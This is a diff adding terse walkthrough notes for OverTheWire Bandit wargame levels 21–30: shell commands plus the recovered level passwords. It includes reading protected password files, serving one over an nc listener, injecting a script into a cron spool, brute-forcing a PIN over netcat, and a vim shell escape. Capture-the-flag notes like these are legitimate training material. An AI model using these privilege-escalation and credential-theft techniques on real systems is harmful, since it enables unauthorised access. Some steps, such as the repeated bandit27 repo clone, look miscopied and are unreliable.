@@ -1,0 +1,122 @@
+LV-21
+
+tmux
+Ctrl+b c
+Shell 1:
+nc -l 1234 < /etc/bandit_pass/bandit20
+Shell 2:
+./suconnect 1234
+
+MDP :
+gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+
+
+LV-22
+cd /etc/cron.d
+cat cronjob_bandit22
+cat /usr/bin/cronjob_bandit22.sh
+cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+
+MDP :
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+
+LV-23
+
+cd /etc/cron.d
+cat cronjob_bandit23
+cat /usr/bin/cronjob_bandit23.sh
+cat /tmp/$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
+
+MDP :
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+
+LV-24
+
+cd /etc/cron.d
+cat cronjob_bandit24
+cd /var/spool/bandit24
+touch t.sh
+nano t.sh
+t.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/tmp_pass
+cat /tmp/tmp_pass
+
+MDP :
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+
+LV-25
+
+cd /tmp
+touch t.sh
+nano t.sh
+####t.sh
+
+touch pin.txt
+cp /dev/null pin.txt
+for i in {0..9}{0..9}{0..9}{0..9}
+do
+	echo $(cat /etc/bandit_pass/bandit24) $i >> pin.txt
+done
+cat pin.txt | nc localhost 30002 > answer.txt
+cat answer.txt
+
+MDP :
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+
+LV-26
+
+:e /etc/bandit_pass/bandit26 
+
+MDP :
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+
+LV-27
+
+v # open vim
+:set shell=/bin/bash # set shell to normal shell
+:shell # return to shell
+./bandit27-do /etc/bandit_pass/bandit27
+
+MDP :
+3ba3118a22e93127a4ed485be72ef5ea
+
+
+LV-28
+
+cd /tmp/
+git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
+cd repo
+cat README
+
+MDP:
+0ef186ac70e04ea33b4c1853d2526fa2
+
+
+LV-29
+
+cd /tmp/
+git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
+cd repo
+git log -p 
+
+MDP :
+bbc96594b4e001778eee9975372716b2
+
+
+LV-30
+
+cd /tmp
+git clone ssh://bandit29-git@localhost/home/bandit29-git/repo 
+cd repo
+git branch -r # check branchs
+git checkout dev
+git log -
+
+MDP :
+5b90576bedb2cc04c86a9e924ce42faf
